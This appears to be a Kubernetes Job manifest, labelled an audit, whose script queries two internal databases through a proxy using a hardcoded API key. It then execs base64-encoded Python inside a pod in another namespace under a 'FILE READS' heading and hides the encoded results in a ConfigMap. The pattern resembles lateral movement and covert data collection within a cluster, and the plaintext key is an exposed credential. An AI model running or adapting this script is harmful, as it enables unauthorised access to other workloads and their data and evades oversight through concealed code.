apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v38
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          OUT=/tmp/out.txt
          echo "=== PROXY SQL TEST ===" > $OUT
          echo -n "SQL_tachyus=" >> $OUT
          curl -sk -X POST http://proxy.default.svc.cluster.local:8000/api/dataexplorer/query/tachyus -H "x-api-key: 3df9e147-d5ff-4164-b6ec-ba8daa48bb59" -H "Content-Type: text/plain" -d "SELECT current_database()" --max-time 10 >> $OUT 2>&1
          echo "" >> $OUT
          echo -n "SQL_tachcorp=" >> $OUT
          curl -sk -X POST http://proxy.default.svc.cluster.local:8000/api/dataexplorer/query/tachcorp -H "x-api-key: 3df9e147-d5ff-4164-b6ec-ba8daa48bb59" -H "Content-Type: text/plain" -d "SELECT current_database()" --max-time 10 >> $OUT 2>&1
          echo "" >> $OUT
          echo "=== FILE READS ===" >> $OUT
          POD=$(kubectl get pods -n dune-api -l app=dune-api -o jsonpath='{.items[0].metadata.name}')
          PYCODE=""
          timeout 60 kubectl exec -n dune-api "$POD" -- python3 -c "import base64; exec(base64.b64decode('$PYCODE').decode())" >> $OUT 2>&1
          ENCODED=$(base64 -w0 $OUT)
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"v38_result\":\"$ENCODED\"}}"